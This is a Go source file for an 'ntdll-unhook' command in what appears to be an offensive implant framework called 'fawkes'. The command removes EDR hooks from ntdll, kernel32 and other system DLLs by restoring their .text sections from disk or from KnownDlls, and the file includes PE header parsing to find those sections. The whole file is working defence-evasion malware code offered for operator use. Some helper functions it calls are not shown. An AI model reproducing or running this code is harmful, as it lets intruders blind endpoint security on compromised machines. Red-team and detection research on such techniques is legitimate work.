//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"
)

var (
	procCreateFileMappingW = kernel32.NewProc("CreateFileMappingW")
	procMapViewOfFile      = kernel32.NewProc("MapViewOfFile")
	procUnmapViewOfFile    = kernel32.NewProc("UnmapViewOfFile")
	procVirtualProtectUH   = kernel32.NewProc("VirtualProtect")
)

var (
	procNtOpenSection       = ntdll.NewProc("NtOpenSection")
	procNtMapViewOfSection  = ntdll.NewProc("NtMapViewOfSection")
	procNtClose             = ntdll.NewProc("NtClose")
)

const (
	sectionMapRead     = 0x0004
	objCaseInsensitive = 0x00000040
	viewUnmap          = 1
)

const (
	genericRead  = 0x80000000
	openExisting = 3
	pageReadonly = 0x02
	secImage     = 0x1000000
	fileMapRead  = 0x0004
)

type imageDOSHeader struct {
	EMagic  uint16
	_       [29]uint16
	ELfanew int32
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type imageSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

var unhookableDLLs = []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll", "user32.dll"}

type NtdllUnhookCommand struct{}

func (c *NtdllUnhookCommand) Name() string {
	return "ntdll-unhook"
}

func (c *NtdllUnhookCommand) Description() string {
	return "Remove EDR hooks from DLLs by restoring the .text section from disk"
}

type ntdllUnhookArgs struct {
	Action string `json:"action"`
	DLL    string `json:"dll"`
	Source string `json:"source"`
}

func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	args, parseErr := unmarshalParams[ntdllUnhookArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		args.Action = "unhook"
	}
	if args.DLL == "" {
		args.DLL = "ntdll.dll"
	}
	if args.Source == "" {
		args.Source = "disk"
	}

	var targetDLLs []string
	if strings.ToLower(args.DLL) == "all" {
		targetDLLs = unhookableDLLs
	} else {
		targetDLLs = []string{args.DLL}
	}

	useKnownDlls := strings.ToLower(args.Source) == "knowndlls"

	switch strings.ToLower(args.Action) {
	case "unhook":
		var sb strings.Builder
		allSuccess := true
		for _, dll := range targetDLLs {
			var output string
			var err error
			if useKnownDlls {
				output, err = unhookDLLFromKnownDlls(dll)
			} else {
				output, err = unhookDLL(dll)
			}
			sb.WriteString(output)
			if err != nil {
				sb.WriteString(fmt.Sprintf("[!] Error unhooking %s: %v\n", dll, err))
				allSuccess = false
			}
			if len(targetDLLs) > 1 {
				sb.WriteString("\n")
			}
		}
		status := "success"
		if !allSuccess {
			status = "error"
		}
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    status,
			Completed: true,
		}

	case "check":
		var sb strings.Builder
		for _, dll := range targetDLLs {
			output, err := checkDLLHooks(dll)
			sb.WriteString(output)
			if err != nil {
				sb.WriteString(fmt.Sprintf("[!] Error checking %s: %v\n", dll, err))
			}
			if len(targetDLLs) > 1 {
				sb.WriteString("\n")
			}
		}
		return successResult(sb.String())

	default:
		return errorf("Unknown action: %s. Use: unhook, check", args.Action)
	}
}

func PerformUnhookNtdll() (string, error) {
	return unhookDLL("ntdll.dll")
}

func findTextSection(baseAddr uintptr) (*imageSectionHeader, error) {
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(baseAddr))
	if dosHeader.EMagic != 0x5A4D {
		return nil, fmt.Errorf("invalid DOS header magic: 0x%X", dosHeader.EMagic)
	}

	ntHeadersAddr := baseAddr + uintptr(dosHeader.ELfanew)

	peSignature := *(*uint32)(unsafe.Pointer(ntHeadersAddr))
	if peSignature != 0x00004550 {
		return nil, fmt.Errorf("invalid PE signature: 0x%X", peSignature)
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(ntHeadersAddr + 4))
	numSections := fileHeader.NumberOfSections
	sizeOfOptionalHeader := fileHeader.SizeOfOptionalHeader

	sectionHeadersAddr := ntHeadersAddr + 4 + 20 + uintptr(sizeOfOptionalHeader)

	for i := uint16(0); i < numSections; i++ {
		section := (*imageSectionHeader)(unsafe.Pointer(
			sectionHeadersAddr + uintptr(i)*40,
		))
		name := string(section.Name[:])
		if strings.HasPrefix(name, ".text") {
			return section, nil
		}
	}

	return nil, fmt.Errorf(".text section not found in %d sections", numSections)
}

func minUintptr(a, b uintptr) uintptr {
	if a < b {
		return a
	}
	return b
}
